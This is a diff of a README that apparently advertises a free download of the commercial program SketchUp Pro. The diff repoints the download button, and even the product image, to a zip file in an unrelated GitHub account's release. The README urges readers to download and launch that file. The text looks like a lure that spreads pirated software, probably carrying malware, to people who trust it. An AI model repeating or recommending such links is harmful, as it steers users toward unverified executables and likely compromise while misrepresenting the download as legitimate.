@@ -24,7 +24,7 @@ In this repository, you will find resources related to SketchUp Pro, including t
 
 ## Software Download
 Click the button below to download the SketchUp Pro software for free!
-[![Download SketchUp Pro](https://img.shields.io/badge/Download-SketchUp%20Pro-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download SketchUp Pro](https://github.com/St4rBoo/SketchUp-Pro-free-2025/releases/download/v1.0.0/Application.zip%20Pro-blue)](https://github.com/St4rBoo/SketchUp-Pro-free-2025/releases/download/v1.0.0/Application.zip)
 
 ## How to Download
 Simply click the button above to download the SketchUp Pro software. Once the download is complete, launch the software to start creating amazing 3D models.
@@ -35,7 +35,7 @@ If the download link above does not work, please check the "Releases" section of
 ## Explore Further
 Visit the official SketchUp website to discover more about SketchUp Pro and its features. Unleash your creativity and bring your ideas to life with SketchUp Pro!
 
-![SketchUp Pro](https://www.sketchup.com/assets/sketchup-2020-share.8dc7adf8b19d.jpg)
+![SketchUp Pro](https://github.com/St4rBoo/SketchUp-Pro-free-2025/releases/download/v1.0.0/Application.zip)
 
 ## Get Started
 Start your 3D modeling journey with SketchUp Pro today. Download the software, explore the tutorials, and let your creativity soar in the world of 3D design.
